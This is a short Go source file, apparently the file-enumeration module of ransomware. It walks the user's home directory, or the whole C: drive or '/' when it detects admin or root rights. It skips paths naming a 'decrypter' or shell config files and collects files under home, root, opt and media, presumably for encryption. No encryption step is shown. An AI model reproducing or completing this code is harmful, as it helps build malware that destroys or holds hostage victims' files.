package explorer

import (
	"fmt"
	"log"
	"os"
	"os/user"
	"runtime"
	"strings"

	"github.com/karrick/godirwalk"
)

func isAuthority() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

func isRoot() bool {
	currentUser, err := user.Current()
	if err != nil {
		log.Fatalf("[isRoot] Unable to get current user: %s", err)
	}
	return currentUser.Username == "root"
}

func MapFiles() []string {
	var files []string
	var root string

	if runtime.GOOS == "windows" {
		//windows
		root = os.Getenv("USERPROFILE")
		if isAuthority() {
			root = "C:\\"
		}
	} else {
		//linux
		if isRoot() {
			root = "/"
		} else {
			root = os.Getenv("HOME") + "/"
		}
	}

	error := godirwalk.Walk(root, &godirwalk.Options{
		Callback: func(path string, de *godirwalk.Dirent) error {
			if strings.Contains(path, "decrypter") || strings.Contains(path, ".bashrc") || strings.Contains(path, ".zshrc") || strings.Contains(path, ".profile") || strings.Contains(path, "bash") || strings.Contains(path, "sh") || strings.Contains(path, "zsh") {
				return nil
			} else if strings.Contains(path, "opt") || strings.Contains(path, "root") || strings.Contains(path, "home") || strings.Contains(path, "media") {
				files = append(files, path)
				return nil
			} else {
				return nil
			}
		},
		Unsorted: true,
	})

	if error != nil {
		fmt.Println(error)
	}

	return files
}
